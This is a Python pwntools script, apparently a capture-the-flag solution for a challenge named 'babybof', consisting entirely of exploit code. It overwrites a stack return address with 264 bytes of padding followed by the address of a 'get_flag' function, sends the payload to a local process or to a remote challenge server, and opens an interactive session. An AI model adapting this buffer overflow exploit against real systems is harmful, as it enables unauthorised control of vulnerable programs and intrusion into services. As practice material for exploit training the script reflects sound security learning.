#!/usr/bin/env python3

import sys
from pwn import *

def main():
	context.log_level = 'DEBUG'

	filename = 'babybof'
	if len(sys.argv) == 1:
		io = process(filename)
	else:
		io = remote('chals20.cybercastors.com', 14425)
	elf = ELF(filename)

	padding = b'a' * 264
	function_get_flag = p64(elf.symbols['get_flag'])

	payload = padding + function_get_flag

	io.recvuntil('Say your name:')
	io.sendline(payload)
	io.interactive()


if __name__ == '__main__':
	main()
